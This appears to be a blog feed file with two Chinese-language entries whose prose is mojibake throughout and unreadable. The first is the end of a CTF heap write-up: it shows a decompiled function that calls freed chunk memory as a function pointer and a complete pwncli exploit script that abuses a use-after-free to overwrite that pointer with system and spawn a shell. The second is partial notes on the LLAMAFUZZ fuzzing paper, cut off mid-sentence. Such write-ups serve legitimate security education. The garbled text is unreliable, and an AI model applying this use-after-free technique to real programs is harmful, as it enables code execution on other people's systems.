‡å·ä¸º0ï¼Œåˆ™å¹¶ä¸ä¼šæ‰§è¡ŒæŸ¥çœ‹<code>chunk</code>çš„åŠŸèƒ½ã€‚</p><p>ä½†æ˜¯ä¼šå°†<code>chunk</code>çš„å†…å®¹ä½œä¸ºå‡½æ•°æŒ‡é’ˆæ‰§è¡Œã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [esp+8h] [ebp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  v2 = __readgsdword(<span class="hljs-number">0x14u</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Input page&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v1);<br>  <span class="hljs-keyword">if</span> ( v1 )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( v1 &lt;= <span class="hljs-number">0</span> || v1 &gt; i )<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;NO PAGE&quot;</span>);<br>    <span class="hljs-keyword">else</span><br>      echo((&amp;page)[v1]);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    (*(page + <span class="hljs-number">1</span>))(page);                        <span class="hljs-comment">// å°†pageä½œä¸ºå‡½æ•°æŒ‡é’ˆè°ƒç”¨</span><br>  &#125;<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14u</span>) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç»¼åˆä»¥ä¸Šåˆ†æ</p><ul><li><code>create</code>å‡½æ•°å›ºå®šç”³è¯·8å­—èŠ‚<code>chunk</code></li><li><code>del</code>å‡½æ•°å­˜åœ¨UAFæ¼æ´</li><li><code>edit</code>å‡½æ•°ä¸èƒ½ä¿®æ”¹0<code>chunk</code>çš„å†…å®¹</li><li><code>show</code>å‡½æ•°å¯ä»¥å°†0<code>chunk</code>çš„å†…å®¹ä½œä¸ºå‡½æ•°æŒ‡é’ˆæ‰§è¡Œ</li></ul><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ©ç”¨UAFæ¼æ´é€šè¿‡1<code>chunk</code>æ¥é—´æ¥ä¿®æ”¹0<code>chunk</code>çš„å†…å®¹ï¼Œæ¯”å¦‚å°†<code>chunk</code>å†…å®¹ä¿®æ”¹ä¸º<code>system</code>å‡½æ•°æˆ–<code>one_gadget</code></p><p>ç„¶åé€šè¿‡<code>show</code>å‡½æ•°è°ƒç”¨æ‰§è¡Œã€‚</p><ol start="2"><li>exp</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br>cli_script()<br><br><br>io: tube = gift.io<br>elf: ELF = gift.elf<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">i, prompt</span>):<br>    sla(prompt, i)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():<br>    cmd(<span class="hljs-string">b&quot;1&quot;</span>,<span class="hljs-string">b&quot;:&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>sla(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>sla(<span class="hljs-string">b&#x27;page&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>sla(<span class="hljs-string">b&#x27;strings&#x27;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>sla(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>sla(<span class="hljs-string">b&#x27;page&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params">index</span>):<br>sla(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>sla(<span class="hljs-string">b&#x27;page&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br>add() <span class="hljs-comment">#index 0</span><br>dele(<span class="hljs-number">0</span>)<br>add() <span class="hljs-comment">#index 1</span><br>edit(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;sh\x00\x00&#x27;</span> + p32(elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))<br>show(<span class="hljs-number">0</span>)<br><br>ia()<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®ºæ–‡ç¬”è®°ï¼šLLAMAFUZZ: Large Language Model Enhanced Greybox Fuzzing</title>
      <link href="/2025/07/01/fuzz/paper/llamafuzz/"/>
      <url>/2025/07/01/fuzz/paper/llamafuzz/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>è®ºæ–‡æ‘˜è¦ï¼šLLAMAFUZZ æ˜¯ä¸€ç¯‡ç ”ç©¶åœ¨ç°ç›’æ¨¡ç³Šæµ‹è¯•ä¸­å¼•å…¥ LLM çš„éå¸¸ç»å…¸çš„è®ºæ–‡ã€‚æœ¬æ–‡ä¸»è¦æå‡ºäº†é€šè¿‡ LLM å¯¹ç§å­è¿›è¡Œç”Ÿæˆï¼Œå¹¶ä¸”åˆ©ç”¨ LLM çš„æ¨ç†èƒ½åŠ›å¯¹ç§å­è¿›è¡Œç»“æ„åŒ–å˜å¼‚ã€‚é€šè¿‡ LLM å¢å¼ºç»“æ„åŒ–æ•°æ®æ¨¡ç³Šæµ‹è¯•çš„èƒ½åŠ›ã€‚è®ºæ–‡åŸºäº LLM é¢„è®­ç»ƒè·å¾—çš„æ•°æ®æ ¼å¼è½¬æ¢çŸ¥è¯†ç”Ÿæˆæœ‰æ•ˆæ–°è¾“å…¥ï¼Œå¹¶é€šè¿‡é…å¯¹å˜å¼‚ç§å­è¿›è¡Œå¾®è°ƒï¼Œä½¿å…¶é«˜æ•ˆæŒæ¡ç»“æ„åŒ–æ ¼å¼ä¸å˜å¼‚ç­–ç•¥ã€‚</p><h2 id="0x01-ç®€ä»‹"><a href="#0x01-ç®€ä»‹" class="headerlink" title="0x01 ç®€ä»‹"></a>0x01 ç®€ä»‹</h2><p>è¿™é‡Œå°±ä¸å¯¹æ¨¡ç³Šæµ‹è¯•çš„æ¦‚å¿µåšä»‹ç»äº†ï¼Œç›´æ¥è¿›å…¥é‡ç‚¹ã€‚</p><p>ä¼ ç»Ÿçš„ fuzzer éš¾ä»¥æœ‰æ•ˆçš„ç”Ÿæˆç»“æ„åŒ–æ•°æ®ã€‚æ¯”å¦‚ AFL++ è™½ç„¶ç»“åˆäº†å¤šç§å˜å¼‚ç­–ç•¥ï¼ˆå¦‚ä½ç¿»è½¬ã€å­—èŠ‚æ’å…¥åˆ é™¤ç­‰ï¼‰å’Œå…ˆè¿›è°ƒåº¦ç­–ç•¥ï¼ˆå¦‚è¦†ç›–ç‡å¼•å¯¼çš„æ¨¡ç³Šæµ‹è¯•ï¼‰ï¼Œä½†æ˜¯åœ¨å¤„ç†éœ€è¦ä¸¥æ ¼ç»“æ„åŒ–è¾“å…¥çš„åº”ç”¨ç¨‹åºæ—¶ï¼Œå…¶ç›²ç›®çš„éšæœºä½çº§å˜å¼‚å¾€å¾€ä¼šç ´åæ•°æ®æ ¼å¼çš„å®Œæ•´æ€§ï¼Œå¯¼è‡´äº§ç”Ÿå¤§é‡æ— æ•ˆçš„è¾“å…¥ç§å­ã€‚å› æ­¤ï¼Œæƒ³è¦å˜å¼‚åˆ°ä¸€ä¸ªå¯¹ç¨‹åºé«˜è¦†ç›–ç‡çš„ç§å­æ¥ fuzzing å‡º bug éœ€è¦éå¸¸é•¿çš„æ—¶é—´ã€‚</p><blockquote><p>å…¸å‹æ¡ˆä¾‹ï¼šæµ‹è¯•PDFè§£æå™¨æ—¶ï¼ŒAFL++ éœ€è¦å¹³å‡ 17 å°æ—¶æ‰èƒ½ç”Ÿæˆå¯é€šè¿‡åŸºç¡€æ ¡éªŒçš„å˜å¼‚æ ·æœ¬ï¼Œè€Œç»“æ„åŒ–æ„ŸçŸ¥æ–¹æ³•ä»…éœ€ 23 åˆ†é’Ÿã€‚</p></blockquote><p>å› æ­¤ï¼Œä¸ºäº†åŠ å¿«è¿™ä¸ªè¿‡ç¨‹ï¼Œhonggfuzz æå‡ºå…±äº«æ–‡ä»¶è¯­æ–™åº“ï¼Œè®© fuzzer åœ¨å¤šè¿›ç¨‹ã€å¤šçº¿ç¨‹ä¸Šè¿è¡Œï¼Œæé«˜ååé‡ï¼Œåœ¨æœ‰é™çš„æ—¶é—´ä¸­ç”Ÿæˆæ›´å¤šçš„æµ‹è¯•ç”¨ä¾‹ã€‚ä½†æ˜¯ï¼Œç”±äºå¤æ‚çš„ç»“æ„éœ€æ±‚ï¼Œå¤©çœŸçš„å¢åŠ ååé‡å’Œæ·»åŠ æ›´å¤šçš„éšæœºçªå˜ç­–ç•¥ä¼šåœ¨çªå˜ç»“æ„åŒ–ç§å­æ—¶äº§ç”Ÿç“¶é¢ˆã€‚AFL++ å’Œ honggfuzz éœ€è¦å¤§é‡çš„å°è¯•æ¥å˜å¼‚æœ‰æ•ˆçš„ç»“æ„åŒ–ç§å­ã€‚å¦ä¸€æ–¹é¢ï¼Œç”±äºéšæœºåŒ–ç­–ç•¥ï¼Œ fuzzer è¡¨ç°å‡ºä¸ç¨³å®šçš„ç»“æœã€‚ä¸ºäº†å‡è½»è¿™ç§ä¸ç¡®å®šæ€§ï¼Œè¯„ä¼°æ¨¡ç³Šæµ‹è¯•éœ€è¦é‡å¤è¯•éªŒä»¥è¿›è¡Œå…¬å¹³æ¯”è¾ƒã€‚ç„¶è€Œï¼Œç°å®ä¸–ç•Œçš„ bug æ˜¯ç¨€ç¼ºçš„ï¼Œ å³ä½¿æ˜¯åæ¬¡é‡å¤çš„è¯•éªŒä¹Ÿä¸èƒ½ç¡®ä¿æ£€æµ‹åˆ° bugã€‚</p><p>å› ä¸ºä¾èµ–éšæœºæ€§å’Œè¦†ç›–ç‡ä¿¡æ¯çš„ fuzzers ç¼ºä¹å¯¹æµ‹è¯•ç§å­çš„ç»“æ„æ€§æ„è¯†ã€‚ä¸ºäº†ç”Ÿæˆæœ‰ä»·å€¼çš„ç»“æ„åŒ–äºŒå…ƒç§å­ï¼Œå·²ç»æå‡ºäº†ä½¿ç”¨é¢„å®šä¹‰è¯­æ³•æ¥åˆ›å»ºç»“æ„åŒ–æ•°æ®çš„ä¸“ç”¨æ¨¡ç³Šå™¨ã€‚Gramatron é‡æ„äº†è¯­æ³•ï¼Œä½¿ å…¶èƒ½å¤Ÿä»è¾“å…¥çŠ¶æ€ç©ºé—´è¿›è¡Œæ— åé‡‡æ ·ï¼Œå¹¶å…è®¸æ›´ç§¯æçš„çªå˜æ“ ä½œã€‚gramatronå°†åŸºäºæœç´¢çš„æµ‹è¯•(Search-based Testing)ä¸åŸºäº è¯­æ³•çš„æ¨¡ç³Šæµ‹è¯•(Grammar-based fuzzing)ç›¸ç»“åˆï¼Œå…±åŒè¿›åŒ–æµ‹ è¯•ç”¨ä¾‹ç”Ÿæˆçš„ä¸¤ä¸ªæ–¹é¢ã€‚ç„¶è€Œï¼ŒGra-matronéœ€è¦åœ¨é¢„å®šä¹‰çš„ ChomskyèŒƒå¼å’ŒGreibachèŒƒå¼ä¸­é™„åŠ è§„èŒƒæ¥æ„å»ºè¯­æ³•è‡ªåŠ¨æœºã€‚ åŒæ—¶ï¼ŒGramatronä¸“æ³¨äºJSONæ ¼å¼ã€‚å¦ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨åŸºäºå— çš„mutatorã€‚WEIZZæå‡ºäº†ä¸€ç§ä¸ºæœªçŸ¥çš„åŸºäºå—çš„äºŒè¿›åˆ¶æ ¼ å¼è‡ªåŠ¨ç”Ÿæˆå’Œæ”¹å˜è¾“å…¥çš„æŠ€æœ¯ã€‚ç„¶è€Œï¼ŒWEIZZå¾ˆéš¾å¤„ç†åŸºäºè¯­ æ³•çš„æ ¼å¼ï¼Œå¦‚JSONã€XMLå’Œç¼–ç¨‹è¯­è¨€ã€‚</p><p>å› æ­¤ï¼Œfuzzer å¼€å‘äººå‘˜é¢ä¸´ç€ä½¿ç”¨é€šç”¨ fuzzer å’Œä¸“ç”¨ fuzzer ä¹‹é—´çš„æƒè¡¡ã€‚é€šç”¨çš„ fuzzer è™½ç„¶ç”¨é€”å¹¿æ³›ï¼Œä½†å¾€å¾€éš¾ä»¥æœ‰æ•ˆåœ°å¤„ç†ç»“æ„åŒ–çš„ç§å­ã€‚å¦ä¸€æ–¹é¢ï¼Œä¸“å‘çš„ fuzzer å¯ä»¥ç”Ÿäº§å‡ºé«˜è´¨é‡çš„ç»“æ„åŒ–ç§å­ï¼Œä½†è¿™ç§ä¸“å‘ä¼šé™åˆ¶å…¶çµæ´»æ€§å’Œé€‚ç”¨æ€§ã€‚ æ­¤å¤–ï¼Œä¾èµ–è¯­æ³•è§„åˆ™ç”Ÿæˆç§å­éœ€è¦å¹¿æ³›çš„é¢†åŸŸçŸ¥è¯†ï¼Œè¿™å¯èƒ½æˆä¸ºå…¶å¹¿æ³›ä½¿ç”¨çš„éšœç¢ã€‚å› æ­¤ï¼Œéœ€è¦ä¸€ç§æ›´å¥½çš„æ–¹æ³•æ¥åˆ©ç”¨é€šç”¨å’Œä¸“ç”¨æ¨¡ç³Šå™¨çš„ä¼˜åŠ¿ã€‚</p><p>ä¸ºäº†è§£å†³ä¸Šè¿°é—®é¢˜ï¼Œè®ºæ–‡æå‡ºä½¿ç”¨å¤§è¯­è¨€æ¨¡å‹æ¥å¢å¼ºæ¨¡ç³Šä¸­çš„å˜å¼‚è¿‡ç¨‹ã€‚ä¸‹å›¾æä¾›äº† LLAMAFUZZ ä½“ç³»ç»“æ„çš„æ¦‚è¿°ã€‚é€šè¿‡å¯¹ä¸åŒæ•°æ®é›†çš„LLM è¿›è¡Œé¢„è®­ç»ƒï¼ŒLLM å¯ä»¥å­¦ä¹ å¤æ‚çš„æ•°æ®è½¬æ¢æ¨¡å¼å’Œæ•°æ®æ ¼å¼ä¿¡æ¯ï¼Œ è¿™å¯¹ç»“æ„åŒ–æ•°æ®çªå˜è‡³å…³é‡è¦ã€‚æ­¤å¤–å¯¹ LLM è¿›è¡Œå¾®è°ƒï¼Œ ä»¥å­¦ä¹ ç‰¹å®šçš„ç»“æ„åŒ–ç§å­æ¨¡å¼å’Œå˜å¼‚ç»“æ„åŒ–ç§å­ï¼Œè¯•å›¾åœ¨é€šç”¨æ¨¡ç³Šå™¨å’Œä¸“ä¸šæ¨¡ç³Šå™¨ä¹‹é—´æ‰¾åˆ°å¹³è¡¡ã€‚</p><p>æˆ‘ä»¬å®ç°äº†æˆ‘ä»¬çš„åŸå‹LLAMAFUZZï¼Œå¹¶åœ¨ä¸¤ä¸ªåŸºå‡†ä¸Šè¿› è¡Œäº†è¯„ä¼°ã€‚ä¸ºäº†è¯„ä¼°æŸ¥æ‰¾bugçš„æ€§èƒ½ï¼Œæˆ‘ä»¬åœ¨åŸºäºbugçš„åŸºå‡†æµ‹è¯•Magma[11]ä¸Šï¼Œä½¿ç”¨æœ€å…ˆè¿›çš„fuzzers AFL++ã€moptaffã€Honggfuzzå’ŒFairfuzzæ¥è¯„ä¼°LLAMAFUZZã€‚ LLAMAFUZZæ¯”æˆ‘ä»¬çš„ç«äº‰å¯¹æ‰‹å¹³å‡å¤šå‡º41ä¸ªbugã€‚æˆ‘ä»¬è¿˜åœ¨ æ‰€æœ‰è¯•éªŒä¸­å‘ç°äº†47ä¸ªç‹¬ç‰¹çš„bugã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬æƒ³çŸ¥é“ LLAMAFUZZå¦‚ä½•åœ¨ä¸åŒç»“æ„åŒ–æ•°æ®æ ¼å¼çš„å®é™…ç¨‹åºä¸­æ‰§è¡Œã€‚ å®éªŒç»“æœè¡¨æ˜ï¼ŒLLAMAFUZZåœ¨15ä¸ªæ¨¡ç³Šç›®æ ‡ä¸­æœ‰10ä¸ªç›®æ ‡çš„ è¦†ç›–ç‡æ¯”AFL++å¹³å‡é«˜å‡º27.19%ã€‚æœ€åä½†å¹¶éæœ€ä¸é‡è¦çš„æ˜¯ï¼Œ æˆ‘ä»¬å±•ç¤ºäº†ä¸€ä¸ªæ¡ˆä¾‹ç ”ç©¶ï¼Œä»¥ç›´è§‚åœ°è§£é‡ŠLLMçªå˜ç§å­å¦‚ä½•åœ¨ ä»£ç è¦†ç›–ç‡æ–¹é¢å¢å¼ºæ¨¡ç³Šè¿‡ç¨‹ã€‚</p><figure>  <img src="assets/Pasted%20image%2020250626212538.png" alt="ç³»ç»Ÿæ¶æ„å›¾">  <figcaption><b>å›¾ 2ï¼š</b>LLAMAFUZZ æ¶æ„å›¾ã€‚</figcaption></figure><p>æœ¬æ–‡ä¸»è¦åšå‡ºäº†ä¸€ä¸‹è´¡çŒ®ï¼š</p><ul><li>æˆ‘ä»¬æå‡ºäº†ä¸€ç§llmå¢å¼ºçš„çªå˜ç­–ç•¥ï¼Œè¯¥ç­–ç•¥å¯ä»¥åº”ç”¨ äºåŸºäºäºŒè¿›åˆ¶å’ŒåŸºäºæ–‡æœ¬çš„æ•°æ®æ ¼å¼ï¼Œåªéœ€å¾®è°ƒæ­¥éª¤ã€‚</li><li>æˆ‘ä»¬æä¾›äº†é€šç”¨æ¨¡ç³Šå™¨å’Œä¸“ç”¨æ¨¡ç³Šå™¨ä¹‹é—´çš„è§£å†³æ–¹æ¡ˆï¼Œ å¯ä»¥å­¦ä¹ ç»“æ„åŒ–ç§å­æ¨¡å¼å¹¶å¯¹ç»“æ„åŒ–ç§å­è¿›è¡Œçªå˜ã€‚</li><li>æˆ‘ä»¬æä¾›äº†ç»éªŒè¯æ®ï¼Œè¯æ˜LLMå¯ä»¥å¢å¼ºçªå˜è¿‡ç¨‹ï¼Œ ä»è€Œæœ‰åˆ©äºæ¨¡ç³Šæµ‹è¯•ä»¥æé«˜ä»£ç è¦†ç›–ç‡ã€‚</li><li>æˆ‘ä»¬æä¾›äº†å®éªŒè§£é‡Šæ¥è¯´æ˜LLMå¦‚ä½•å¢å¼ºæ¨¡ç³Šè¿‡ç¨‹ã€‚</li><li>æˆ‘ä»¬è®¾è®¡äº†ä¸€ç§è½»é‡çº§çš„å¼‚æ­¥æ–¹æ³•æ¥åˆ©ç”¨llmå’Œæ¨¡ç³Šå™¨ï¼Œ å…è®¸LLAMAFUZZè½»æ¾éƒ¨ç½²åœ¨å•GPUæˆ–å¤šGPUä¸Šã€‚</li></ul><h2 id="0x02-èƒŒæ™¯"><a href="#0x02-èƒŒæ™¯" class="headerlink" title="0x02 èƒŒæ™¯"></a>0x02 èƒŒæ™¯</h2><p>ä»‹ç»åŸºäºå˜å¼‚çš„æ¨¡ç³Šæµ‹è¯•å’Œè¦†ç›–ç‡å¼•å¯¼çš„ç°ç›’æ¨¡ç³Šæµ‹è¯•çš„èƒŒæ™¯ã€‚ç„¶åï¼Œæä¾›äº†ä¸€äº›ç»“æ„åŒ–æ•°æ®æ¨¡ç³Šæµ‹è¯•çš„å½“å‰è§£å†³æ–¹æ¡ˆã€‚</p><h3 id="2-1-åŸºäºå˜å¼‚çš„æ¨¡ç³Šæµ‹è¯•"><a href="#2-1-åŸºäºå˜å¼‚çš„æ¨¡ç³Šæµ‹è¯•" class="headerlink" title="2.1 åŸºäºå˜å¼‚çš„æ¨¡ç³Šæµ‹è¯•"></a>2.1 åŸºäºå˜å¼‚çš„æ¨¡ç³Šæµ‹è¯•</h3><p>å˜å¼‚ç­–ç•¥çš„ç›®æ ‡æ˜¯ä»ç»™å®šçš„ç§å­ä¸­ç”Ÿæˆæ–°çš„æµ‹è¯•ç”¨ä¾‹ï¼Œä»¥å‘ç°ä»¥å‰æœªè¦†ç›–çš„ç¨‹åºåŒºåŸŸã€‚å˜å¼‚å¯ä»¥æ˜¯éšæœºçš„ï¼Œå³å¯¹ç§å­è¿›è¡Œä»»æ„æ›´æ”¹ã€‚AFL++ ä½œä¸ºæœ€å…ˆè¿›çš„æ¨¡ç³Šæµ‹è¯•å·¥å…·ï¼Œå®ƒä½¿ç”¨ä¸‰ä¸ªé˜¶æ®µè¿›è¡Œå˜å¼‚ï¼š</p><ul><li><strong>ç¡®å®šæ€§é˜¶æ®µ</strong>ï¼šåŒ…æ‹¬ä¸åŒé•¿åº¦çš„æ¯”ç‰¹ç¿»è½¬ï¼Œå¯¹å°æ•´æ•°çš„åŠ å‡æ“ä½œï¼Œä»¥åŠå·²çŸ¥çš„â€œæœ‰è¶£â€æ•´æ•°ï¼›</li><li><strong>æ‰°ä¹±é˜¶æ®µ</strong>ï¼šéšæœºå¤šæ¬¡é€‰æ‹©å˜å¼‚æ“ä½œç¬¦ï¼Œå¹¶å°†å…¶åº”ç”¨äºç§å­å†…çš„å¤šä¸ªéšæœºä½ç½®ï¼›</li><li><strong>æ‹¼æ¥é˜¶æ®µ</strong>ï¼šå°†æ¥è‡ªä¸¤ä¸ªä¸åŒç§å­çš„ç‰‡æ®µç»„åˆæˆåˆ›å»ºä¸€ä¸ªæ–°çš„æµ‹è¯•ç”¨ä¾‹ï¼Œå¹¶è¿›ä¸€æ­¥åœ¨æ‰°ä¹±é˜¶æ®µä¸­å¯¹å…¶è¿›è¡Œå˜å¼‚ã€‚</li></ul><p>åŸºäºå˜å¼‚çš„ç­–ç•¥å¯ä»¥æ›´å¹¿æ³›åœ°æ¢ç´¢è¾“å…¥ç©ºé—´ï¼Œä½†å…¶å†…åœ¨çš„éšæœºæ€§ä¹Ÿå¸¦æ¥äº†æ›´å¤§çš„ä¸ç¡®å®šæ€§å’Œæ•ˆç‡ä½ä¸‹ã€‚å› æ­¤ï¼Œä¼ ç»Ÿçš„ç°ç›’æ¨¡ç³Šæµ‹è¯•å·¥å…·æå¾ˆéš¾ç”Ÿæˆæœ‰æ•ˆè¾“å…¥ï¼Œå¾€å¾€éœ€è¦æŒ‡æ•°çº§çš„æ—¶é—´æ‰èƒ½æ·±å…¥æ¢ç´¢åˆ›æ–°è¡Œä¸ºã€‚</p><p>æœ¬æ–‡æå‡ºä¸€ç§åˆ©ç”¨ LLM çš„æ–¹æ³•ï¼ŒåŸºäºå·²æœ‰ç§å­è¿›è¡Œç»“æ„æ„ŸçŸ¥çš„å˜å¼‚ã€‚ç”±äº LLM èƒ½ç†è§£è¾“å…¥ç§å­çš„ç»“æ„ï¼Œå¹¶åœ¨ä¿æŒå…¶æœ‰æ•ˆæ€§çš„å‰æä¸‹è¿›è¡Œä¿®æ”¹ï¼Œå› æ­¤è¯¥æ–¹æ³•åœ¨åŠ é€Ÿæ¼æ´å‘ç°ã€æå‡è¦†ç›–è·¯å¾„æ•°é‡ä»¥åŠå‘ç°æ¼æ´çš„æ€»é‡æ–¹é¢å±•ç°å‡ºäº†æ˜¾è‘—æ•ˆæœã€‚</p><h3 id="2-2-è¦†ç›–ç‡å¼•å¯¼çš„ç°ç›’æ¨¡ç³Šæµ‹è¯•"><a href="#2-2-è¦†ç›–ç‡å¼•å¯¼çš„ç°ç›’æ¨¡ç³Šæµ‹è¯•" class="headerlink" title="2.2 è¦†ç›–ç‡å¼•å¯¼çš„ç°ç›’æ¨¡ç³Šæµ‹è¯•"></a>2.2 è¦†ç›–ç‡å¼•å¯¼çš„ç°ç›’æ¨¡ç³Šæµ‹è¯•</h3><p>ä¸ºå…‹æœåŸºäºå˜å¼‚çš„æ¨¡ç³Šæµ‹è¯•ä¸­å›ºæœ‰çš„éšæœºæ€§é—®é¢˜ï¼Œç ”ç©¶äººå‘˜æå‡ºä½¿ç”¨ä½å›¾ï¼ˆbit-mapï¼‰è®°å½•è¦†ç›–ä¿¡æ¯ï¼Œä½œä¸ºåé¦ˆæ¥æ›´æœ‰æ•ˆåœ°æŒ‡å¯¼æ¨¡ç³Šæµ‹è¯•è¿‡ç¨‹ ã€‚ç”±äºæ¼æ´é€šå¸¸éšè—åœ¨å°šæœªè¢«è¦†ç›–çš„æ‰§è¡Œè·¯å¾„ä¸­ï¼Œå› æ­¤æ‰©å¤§æ‰§è¡Œè·¯å¾„çš„è¦†ç›–èŒƒå›´è¢«è®¤ä¸ºæ˜¯æå‡æ¨¡ç³Šæµ‹è¯•æ€§èƒ½çš„åˆç†æ–¹å‘ã€‚</p><p>å¯¹äºä¸€ä¸ªè¢«æµ‹è¯•çš„ç¨‹åºå’Œä¸€ç»„åˆå§‹ç§å­ï¼Œè¦†ç›–å¼•å¯¼çš„ç°ç›’æ¨¡ç³Šæµ‹è¯•ä¸»è¦åŒ…å«ä»¥ä¸‹å››ä¸ªé˜¶æ®µï¼š</p><ol><li><strong>ç§å­é˜Ÿåˆ—</strong>ï¼šä»ç§å­æ± ä¸­é€‰æ‹©ä¸€ä¸ªç§å­ç”¨äºå˜å¼‚ï¼›</li><li><strong>ç§å­å˜å¼‚</strong>ï¼šä½¿ç”¨å¤šç§å˜å¼‚ç­–ç•¥å¯¹é€‰ä¸­çš„ç§å­è¿›è¡Œå˜å¼‚ï¼Œç”Ÿæˆæ–°çš„æµ‹è¯•ç”¨ä¾‹ï¼›</li><li><strong>æ‰§è¡Œé˜¶æ®µ</strong>ï¼šå°†å½“å‰æµ‹è¯•ç”¨ä¾‹è¾“å…¥ç›®æ ‡ç¨‹åºæ‰§è¡Œï¼›</li><li><strong>è¡Œä¸ºç›‘æµ‹</strong>ï¼šå°†æ¯ä¸ªæ–°çš„ç§å­é€å…¥æ’æ¡©è¿‡çš„ç¨‹åºä¸­æ‰§è¡Œï¼Œå¹¶é€šè¿‡è¦†ç›–ç‡æŒ‡æ ‡è¿›è¡Œè¯„ä¼°ï¼›å¦‚æœè¯¥ç§å­è§¦å‘äº†æ–°çš„ä»£ç è¦†ç›–è·¯å¾„ï¼Œåˆ™å°†å…¶æ·»åŠ å›ç§å­é˜Ÿåˆ—ï¼Œä¾›è¿›ä¸€æ­¥æ¨¡ç³Šæµ‹è¯•ä½¿ç”¨ã€‚</li></ol><p>éšç€æ¨¡ç³Šæµ‹è¯•å¾ªç¯çš„ä¸æ–­è¿›è¡Œï¼Œæ›´å¤šçš„ä»£ç åˆ†æ”¯å°†è¢«æ¢ç´¢ï¼Œä»è€Œæœ‰æ›´å¤§æ¦‚ç‡è§¦å‘æ½œåœ¨çš„æ¼æ´ã€‚</p><figure>  <img src="assets/Pasted%20image%2020250629084732.png" alt="ç³»ç»Ÿæ¶æ„å›¾">  <figcaption><b>å›¾ 2ï¼š</b>æ ·æœ¬è¾“å…¥å’ŒLLMçªå˜ç»“æœçš„PNGç¤ºä¾‹ã€‚</figcaption></figure><h3 id="2-3-ç»“æ„åŒ–ç§å­å˜å¼‚"><a href="#2-3-ç»“æ„åŒ–ç§å­å˜å¼‚" class="headerlink" title="2.3 ç»“æ„åŒ–ç§å­å˜å¼‚"></a>2.3 ç»“æ„åŒ–ç§å­å˜å¼‚</h3><p>è¦†ç›–å¼•å¯¼çš„ç°ç›’æ¨¡ç³Šæµ‹è¯•åœ¨å‘ç°ç°å®ä¸–ç•Œç¨‹åºä¸­çš„æ¼æ´æ–¹é¢å·²è¢«è¯æ˜æ˜¯æœ‰æ•ˆçš„ã€‚ç„¶è€Œï¼Œéšç€è½¯ä»¶å¼€å‘çš„æ—¥ç›Šå¤æ‚ï¼Œè¶Šæ¥è¶Šå¤šçš„ç¨‹åºé‡‡ç”¨å…·æœ‰ç‰¹æ®Šæ ¼å¼çš„é«˜åº¦ç»“æ„åŒ–æ•°æ®ï¼Œè¿™å¯¹ä¼ ç»Ÿæ¨¡ç³Šæµ‹è¯•æŠ€æœ¯æå‡ºäº†å·¨å¤§æŒ‘æˆ˜ã€‚ä¼ 